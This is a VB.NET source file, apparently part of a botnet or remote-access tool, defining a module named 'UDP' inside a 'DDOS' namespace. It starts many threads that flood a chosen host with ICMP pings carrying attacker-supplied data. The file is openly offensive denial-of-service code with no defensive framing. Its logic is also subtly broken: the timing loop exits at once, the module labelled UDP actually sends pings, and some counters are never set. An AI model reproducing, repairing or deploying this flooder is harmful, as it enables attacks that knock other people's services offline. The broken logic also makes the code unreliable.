Imports System.Threading
Imports System.Net

Namespace DDOS
    Public Module UDP
        Public HostToAttack As String
        Private ThreadsEnded = 0
        Private ThreadstoUse As Integer
        Private TimetoAttack As Integer
        Private Threads As Thread()
        Private AttackRunning As Boolean = False
        Private attacks As Integer = 0
        Public Time As Integer
        Public Threadsto As Integer
        Public DOSData As String

        Public Sub StartUDP()
            If Not AttackRunning = True Then
                If HostToAttack.Contains("http://") Then HostToAttack = HostToAttack.Replace("http://", String.Empty)
                If HostToAttack.Contains("www.") Then HostToAttack = HostToAttack.Replace("www.", String.Empty)
                If HostToAttack.Contains("/") Then HostToAttack = HostToAttack.Replace("/", String.Empty)
                AttackRunning = True
                Threads = New Thread(Threadsto - 1) {}
                For i As Integer = 0 To Threadsto - 1
                    Threads(i) = New Thread(Sub() Attack(HostToAttack))
                    Threads(i).IsBackground = True
                    Threads(i).Start()
                Next
            End If
        End Sub
        Public Sub StopUDP()
            If AttackRunning = True Then
                For i As Integer = 0 To ThreadstoUse - 1
                    Try
                        Threads(i).Abort()
                    Catch
                    End Try
                Next
                AttackRunning = False
                attacks = 0

            Else

            End If
        End Sub
        Public Sub Attack(Host As String)
            Try
                Dim hostip As Net.IPAddress = Net.IPAddress.Parse(Net.Dns.GetHostAddresses(Host)(0).ToString())
                Dim span As TimeSpan = TimeSpan.FromSeconds(CDbl(TimetoAttack))
                Dim stopwatch As Stopwatch = stopwatch.StartNew
                Do Until (stopwatch.Elapsed < span)
                    Dim aa As New System.Net.NetworkInformation.Ping
                    Dim bb As System.Net.NetworkInformation.PingReply
                    Dim txtlog As String = ""
                    Dim cC As New System.Net.NetworkInformation.PingOptions
                    cC.DontFragment = True
                    cC.Ttl = 64
                    Dim data As String = DOSData
                    Dim bt As Byte() = System.Text.Encoding.ASCII.GetBytes(data)
                    Dim i As Int16
                    For i = 0 To 1000 Step 1
                        bb = aa.Send(hostip, 100, bt, cC)
                    Next i
                Loop
            Catch ex As Exception

            End Try
            lol()
        End Sub
        Private Sub lol()

            ThreadsEnded = ThreadsEnded + 1
            If ThreadsEnded = ThreadstoUse Then
                ThreadsEnded = 0
                ThreadstoUse = 0
                AttackRunning = False
                attacks = 0
            End If

        End Sub
    End Module
End Namespace